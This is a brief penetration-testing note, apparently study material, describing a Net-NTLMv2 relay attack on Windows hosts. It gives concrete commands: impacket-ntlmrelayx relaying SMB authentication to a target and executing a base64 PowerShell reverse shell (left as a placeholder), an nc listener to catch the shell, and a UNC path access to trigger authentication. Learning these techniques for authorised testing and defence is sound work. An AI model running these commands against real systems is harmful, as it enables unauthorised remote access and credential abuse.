
Always check this vector when dealing with Windows systems.

We use Net-NTLMv2 relay attack when we obtain a hash but it is too complex to crack, so we relay the NTLM hash to authenticate with a remote server where the owning user may be present.

If UAC is activated on the target systems and we don't have Administrator user we will not be able to successfully complete this attack.

#### Relay attack

1. `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "<Powershell-oneliner reverse shell base64 encoded>"` run on attacking system to setup smb service and relay of incoming authentication requests to `-t` (target)
2. `nc -nvlp 8080` start listener for the powershell reverse shell
3. `dir \\ip\share` run command on target system to prompt smb authentication attempt to our smb service relay setup and obtain reverse shell